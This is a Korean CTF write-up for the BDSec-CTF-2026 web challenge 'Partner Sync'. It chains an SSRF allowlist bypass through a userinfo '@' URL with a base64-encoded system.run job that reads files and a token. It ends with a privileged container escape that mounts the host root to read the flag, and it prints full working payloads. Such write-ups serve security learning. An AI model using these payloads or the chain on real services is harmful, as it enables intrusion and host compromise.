|CTF Name|BDSec-CTF-2026|
|------|---|
|CTF URL|https://2026.bdsec-ctf.com/challenges#Partner%20Sync-32|
|Challenge Name|Partner Sync|
|Challenge Category|Web|
|Author|pmsiam0|
|Points|105|
|Solves|80|
|Status|Not Solved|

---

## 📝 Description
> A partner integration service exposes a URL fetch feature meant only for approved internal use. Something in how it validates "approved" doesn't hold up.<br>This is a multi stage chain expect to pivot through more than one service before you're anywhere near a flag. No brute force or fuzzing is required or intended at any point; every step here is a logic bug not a guessing game. If you find yourself trying hundreds of payloads against the same input you've gone down the wrong path step back and look at what the application is actually telling you.

> Connection Info : http://104.237.133.5:8080 

> (번역) 파트너 통합 서비스에서 내부 승인 사용자만 사용할 수 있는 URL 가져오기 기능을 제공합니다. 그런데 "승인" 여부를 검증하는 방식에 문제가 있는 것 같습니다.<br>이것은 여러 단계로 이루어진 복잡한 과정이며, 목표 지점에 도달하기 전에 여러 서비스를 거쳐야 할 가능성이 높습니다. 무차별 대입 공격이나 퍼징은 어떤 단계에서도 필요하지 않으며, 의도된 방법도 아닙니다. 모든 단계는 논리적 오류를 찾는 것이지 추측 게임이 아닙니다. 동일한 입력에 대해 수백 개의 페이로드를 시도하고 있다면 잘못된 방향으로 가고 있는 것이므로, 한 걸음 물러서서 애플리케이션이 실제로 무엇을 말하고 있는지 살펴보세요.

목표 : SSRF 취약점을 이용해 서버 내부 자원에 접근해야 한다.

---

## 🔍 Recon

### Early Ideas

페이지에 접속하면 임의의 URL로 요청을 보낼 수 있는 form이 존재한다. 가장 먼저 떠오른 공격 방식은 SSRF였다. 서버의 권한으로 내부 자원에 접근해 flag를 읽는 것이다.

그리고 주석을 확인하니 다음과 같이 실수로 남겨둔 파일에 대한 정보가 있었다.

```
<!-- TODO(OPS-410): pull /static/js/ops-console.js out of the bundle before
       launch, on-call doesn't need the browser console tool anymore now
       that internal-api migration is done -->

```

### Tools

- Burp Suite
- Browser



### Findings

`/static/js/ops-console.js`엔 레거시 빌드 코드가 존재했고 서버 소스코드 일부를 확인할 수 있었다.

그리고 두 개의 접근 대상인 서비스를 확인할 수 있다.

```
 *   internal-api -> internal-api:9000   (job runner, see buildJob below)
 *   dind-gate    -> dind-gate:7000/rpc  (orchestration proxy, see buildRpc)
```

아래엔 사용자 입력값을 검증하는 나름의 필터링이 있는데 취약점이 존재했다.

```
const PartnerOps = (() => {
  // keep in sync with server-side allowlist check — see partner-sync.md
  // 번역-서버 측 허용 목록(allowlist) 확인과 동기화 상태를 유지하세요 — partner-sync.md 참조
  const ALLOWED_PREFIX = "http://partners.bdsec.local";

  function isAllowedPartnerUrl(url) {
    return url.startsWith(ALLOWED_PREFIX);
  }
```

`startsWith()` 함수로, 사용자 입력값이 'http://partners.bdsec.local'로 시작해야 한다는 조건이 붙는데 이는 `@`를 이용해 우회 가능하다.

기본적인 URL 구조에서 `@` 앞부분은 사용자 정보로 인식된다. `http://username:password@주소:포트/경로`인 셈이다. 이때문에 http://partners.bdsec.local@internal-api:9000를 입력하면 조건문에선 http://partners.bdsec.local로 시작해 통과하지만 실상 처리되는 URL은 internal-api:9000인 셈이다.

`http://partners.bdsec.local@internal-api:9000`를 입력하면 응답은 다음과 같다.

```
{"body":"<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n","status_code":404}

```

소스코드를 더 살펴보면 internal-api:9000에서 가능한 작업이 더 확인된다. 주석엔 system.run()을 실행할 수 있는 방법이 명시돼 있다.

`buildJob()` 파라미터인 `handler`는 `system.run()`일 것이며, arg는 system.run()의 인자(= shell 명령)일 것이다. 이걸 custom encoding을 통해 internal-api:9000에 전송한다.
```

  // 내부 API 작업 와이어 형식(DOC-1183), 내부 API:9000에서 접근 가능: 
  //   [u32 BE: handler name length][handler name bytes]
  //   [u32 BE: arg length][arg bytes]
  //
  // known namespaces:
  // report -> 내장 함수, 대부분 비활성화, 장식용 
  // system -> 운영 도우미 
  // system.uptime -> 안전한 상태 확인, 사용 가능 
  // system.run -> OPS-402: 디버그 전용, 어디에도 연결하지 마십시오 
  function buildJob(handler, arg) {
    const enc = new TextEncoder();
    const h = enc.encode(handler);
    const a = enc.encode(arg);
    const buf = new Uint8Array(4 + h.length + 4 + a.length);
    const view = new DataView(buf.buffer);
    view.setUint32(0, h.length, false);
    buf.set(h, 4);
    view.setUint32(4 + h.length, a.length, false);
    buf.set(a, 4 + h.length + 4);
    return buf;
  }

```

인공지능의 도움을 받아 `internal-api:9000/job`이라는 엔드포인트를 발견했지만 /job은 POST method를 요구했다. 이어 커스텀 인코딩을 수행해도 이를 어떻게 request body로 전달하는지에 대한 문제도 있었다.
```
{"body":"<!doctype html>\n<html lang=en>\n<title>405 Method Not Allowed</title>\n<h1>Method Not Allowed</h1>\n<p>The method is not allowed for the requested URL.</p>\n","status_code":405}
```

CTF가 끝날 때까지 이 이상 진도를 나가는 것이 불가능했고, 이후 다른 풀이자가 디스코드에 공유한 풀이 방법을 참고해 해결했다.

```

Partner Sync
1. Bypass partner allowlist with userinfo URL: http://partners.bdsec.local@internal-api:9000/job 
2. Use hidden /sync-partner fields: method=POST and body_b64=...
3. Send internal api binary job for system.run
4. Read /app_shared/.internal_token
5. From internal api RCE,  POST proper JSON to dind-gate:7000/rpc
6. Mount host, write /tmp/x/policy.conf, then run /vault/read_flag via chroot : )

```

---

## 🧪 Exploitation / Analysis

풀이의 2번을 보면 `method=POST&body_b64=...`를 함께 `/sync-partner?partner_url=`에 붙여 전송할 수 있다고 한다.

이 두 파라미터는 어디서 나온 건지 전혀 모르겠다..

출제자 왈

> buildJob() 함수를 보면 패킷 바이트가 어떻게 구성되는지 알 수 있습니다. partner_url처럼 일반 텍스트 형식으로 입력하면 출력 불가능한 바이트 때문에 파싱이 제대로 되지 않아 base64로 인코딩해야 합니다. 텍스트 기반 전송 방식을 사용하는 거의 모든 API가 이와 같은 방식으로 바이너리 데이터를 전송합니다. 이는 특별히 어려운 부분이 아니라 누구나 기본적으로 사용하는 방식입니다. 솔직히 말해서, 바이너리 데이터가 텍스트 본문에서 제대로 전송되려면 base64 또는 그와 유사한 인코딩이 필요하다는 것은 HTTP 구문처럼 이러한 종류의 작업에서 당연히 알고 있어야 하는 배경 지식입니다. 실제로 어려웠던 점은 패킷을 피벗을 통해 전달해야 한다는 사실과 그 패킷에 어떤 내용이 포함되어야 하는지 파악하는 것이었습니다'

라는데, 아무래도 경험으로 쌓은 지식이 있었으면 쉽게 해결할 수 있는 부분인 것 같다.

아무튼 [stage2_generatePayload.js](https://github.com/K1M0TO/BDSec-CTF-2026/blob/main/02%20Challs/05%20Partner%20Sync/stage2_generatePayload.js)로 /job 엔드포인트로 app.py를 읽는 요청을 전송한다.
```
http%3A%2F%2Fpartners.bdsec.local%40internal-api%3A9000/job&method=POST&body_b64=AAAACnN5c3RlbS5ydW4AAAAPY2F0IC9hcHAvYXBwLnB5
```

그럼 결과로 app.py가 출력되는데, 중요한 내용만 추려보면 다음과 같다.

> BDSEC Insane CTF - 내부 전용 서비스 (Stage 2: 커스텀 프로토콜 RCE)<br>이 서비스는 호스트에 절대 노출되지 않으며, 백엔드 네트워크 외부에서의 접근 경로도 없습니다. 다음의 경우에만 접근 가능합니다:<br>
> (a) 이미 백엔드 네트워크 내부에 있는 경우 직접 접근, 또는<br>
  (b) `web` 서비스를 통한 Stage 1 SSRF 우회 공격.

SSRF를 이용해 Stage 1을 통과했고, app.py를 읽음으로써 Stage 2에 필요한 정보를 획득한 셈이다.

> 어떤 핸들러로든 첫 번째 요청이 성공적으로 도달하면, 이 서비스는 인스턴스별 일회용 토큰을 `/app/.internal_token`에 기록합니다. 이 파일은 `worker` 사용자만 읽을 수 있습니다. 해당 토큰은 3단계(dind-gate/app.py 참조)에서 필요합니다. 이는 단순히 파서 오류를 유발한 것이 아니라, 실제로 코드 실행을 달성했음을 입증하는 아티팩트(결과물)입니다.


다음 목표는 Stage 3으로, dind-gate 서비스를 호출하는 것이다. 또한 호출에 성공하면 매번 새로운 토큰이 발급되어 /app/.internal_token에 저장된다는 사실도 확인할 수 있다.

stage2_generatePayload.js에 `cat /app_shared/.internal_token`를 넣어 실행시키면 다음과 같은 payload가 생성된다. 참고로 ls -al을 넣어 전송해보면 /app/ 디렉토리엔 .internal_token가 없다. 공개된 풀이에서도 app_shared를 참조한다. (app_shared는 여러 컨테이너가 공유하는 공유 볼륨(Volume)이라고 한다.)

`partner_url=http%3A%2F%2Fpartners.bdsec.local%40internal-api%3A9000/job&method=POST&body_b64=AAAACnN5c3RlbS5ydW4AAAAfY2F0IC9hcHBfc2hhcmVkLy5pbnRlcm5hbF90b2tlbg%3D%3D`
```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.11.15
Date: Wed, 22 Jul 2026 18:26:04 GMT
Content-Type: application/json
Content-Length: 81
Connection: close

{"body":"{\"result\":\"494860051f233327634b137760eedad7\"}\n","status_code":200}

```

이어 `/static/js/ops-console.js`에서 dind-gate 부분을 보면 `POST dind-gate/7000/rpc`로 요청 가능하며 파라미터는 앞에서의 토큰, cmd(실행명령), opts인 것을 알 수 있다.

한번 짚고가자면 internal-api와 dind-gate는 다른 Docker 컨테이너에서 동작한다. 

flag는 dind-gate에 존재하나 우리가 RCE를 수행(system.run())하는 곳은 internal-api이다. 그리고 아래 주석을 보면 internal-api에서 발급받은 token이 있으면 dind-gate의 RPC를 호출할 수 있다.

```
  *   PartnerOps.buildRpc(token, cmd, opts) // dind-gate rpc shape

  // dind-gate rpc shape (OPS-410, internal orchestration proxy):
  //   POST /rpc  { token, op: "run", image, cmd: [...], binds: [...], privileged }
  // token = 작업이 실제로 실행된 후 internal-api가 반환하는 값 —
  // 세션 비밀값(session secret)처럼 취급하세요. dind-gate가 확인하는 유일한 정보입니다.
  function buildRpc(token, cmd, opts = {}) {
    return {
      token,
      op: "run",
      image: opts.image || "alpine",
      cmd,
      binds: opts.binds || [],
      privileged: !!opts.privileged,
    };
  }

```

internal-api에서 system.run()을 통한 RCE가 가능함을 알았으니 다른 컨테이너인 dind-gate:7000/run에 접근해 flag를 읽어야 한다.

[stage3_buildJob.js](https://github.com/K1M0TO/BDSec-CTF-2026/blob/main/02%20Challs/05%20Partner%20Sync/stage3_buildJob.js)를 사용한다.

핵심 코드는 다음과 같다. /app_shared/.internal_token 파일을 여는 즉시 (호출할 때마다 토큰이 갱신되어서 그런가 토큰을 얻고 dind-gate:7000/rpc에 접근하면 잘못된 토큰이라고 떴다.) buildRpc() 형식에 맞는 JSON을 생성한다. cmd에는 id, ls 등의 명령을 순차적으로 실행해 flag 위치를 찾았고 최종적으로 `/mnt/host/vault/`에서 flag.txt가 존재함을 확인했다. 그리고 코드 내부에서 `http://dind-gate:7000/rpc`로 직접 요청을 전송했다.

```
python3 -c 'import json,urllib.request;
t=open("/app_shared/.internal_token").read().strip();
d={
       "token":t,
       "op":"run",
       "image":"alpine",
       "cmd":["/bin/sh","-c","cat /mnt/host/vault/flag.txt"],
       "binds":["/:/mnt/host"],
       "privileged":True
};
r=urllib.request.Request("http://dind-gate:7000/rpc",data=json.dumps(d).encode(),headers={"Content-Type":"application/json"},method="POST"); print(urllib.request.urlopen(r).read().decode())'
```

Burp Suite를 통해 아래 payload를 전송하면 RCE에 성공하고 응답에서 Flag를 획득할 수 있다.

`partner_url=http%3A%2F%2Fpartners.bdsec.local%40internal-api%3A9000%2Fjob&method=POST&body_b64=AAAACnN5c3RlbS5ydW4AAAGncHl0aG9uMyAtYyAnaW1wb3J0IGpzb24sdXJsbGliLnJlcXVlc3Q7IHQ9b3BlbigiL2FwcF9zaGFyZWQvLmludGVybmFsX3Rva2VuIikucmVhZCgpLnN0cmlwKCk7IGQ9eyJ0b2tlbiI6dCwib3AiOiJydW4iLCJpbWFnZSI6ImFscGluZSIsImNtZCI6WyIvYmluL3NoIiwiLWMiLCJjYXQgL21udC9ob3N0L3ZhdWx0L2ZsYWcudHh0Il0sImJpbmRzIjpbIi86L21udC9ob3N0Il0sInByaXZpbGVnZWQiOlRydWV9OyByPXVybGxpYi5yZXF1ZXN0LlJlcXVlc3QoImh0dHA6Ly9kaW5kLWdhdGU6NzAwMC9ycGMiLGRhdGE9anNvbi5kdW1wcyhkKS5lbmNvZGUoKSxoZWFkZXJzPXsiQ29udGVudC1UeXBlIjoiYXBwbGljYXRpb24vanNvbiJ9LG1ldGhvZD0iUE9TVCIpOyBwcmludCh1cmxsaWIucmVxdWVzdC51cmxvcGVuKHIpLnJlYWQoKS5kZWNvZGUoKSkn`


```
{"body":
       "{\"result\":\"{\\\"returncode\\\":0,\\\"stderr\\\":\\\"\\\",\\\"stdout\\\":\\\"BDSEC{■■■_■■■■_■■■_■■■■■}\\\\n\\\"}\\n\\n\"}\n","status_code":200}
```

## 📚 Lessons Learned

- URL Allowlist는 문자열 Prefix가 아닌 실제 Host를 기준으로 검증해야 한다.
- 컨테이너 간 인증 정보와 공유 볼륨은 다른 서비스로의 피벗(Pivot) 공격 경로가 될 수 있다.
